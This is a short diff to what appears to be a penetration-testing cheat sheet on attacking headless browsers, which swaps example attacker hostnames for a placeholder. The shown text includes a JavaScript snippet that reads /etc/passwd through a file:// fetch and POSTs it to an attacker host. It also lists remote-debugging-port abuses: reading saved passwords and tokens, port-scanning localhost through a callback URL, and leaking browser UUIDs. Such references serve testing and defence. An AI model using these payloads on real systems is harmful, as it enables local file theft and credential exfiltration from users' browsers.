@@ -53,7 +53,7 @@ Since the file access is allowed, an atacker can create and expose an HTML file 
   async function getFlag(){
     response = await fetch("file:///etc/passwd");
     flag = await response.text();
-    fetch("https://attacker.com/", { method: "POST", body: flag})
+  fetch("https://[ATTACKER.DOMAIN.TLD]/", { method: "POST", body: flag})
   };
   getFlag();
 </script>
@@ -106,7 +106,7 @@ The Remote Debugging Port in a headless browser (like Headless Chrome or Chromiu
 * Connect and interact with the browser: `chrome://inspect/#devices`, `opera://inspect/#devices`
 * Kill the currently running browser and use the `--restore-last-session` to get access to the user's tabs
 * Data stored in the settings (username, passwords, token): `chrome://settings`
-* Port Scan: In a loop open `http://localhost:<port>/json/new?http://callback.example.com?port=<port>`
+* Port Scan: In a loop open `http://localhost:<port>/json/new?http://[ATTACKER.DOMAIN.TLD]/?port=<port>`
 * Leak UUID: Iframe: `http://127.0.0.1:<port>/json/version`
 
     ```json
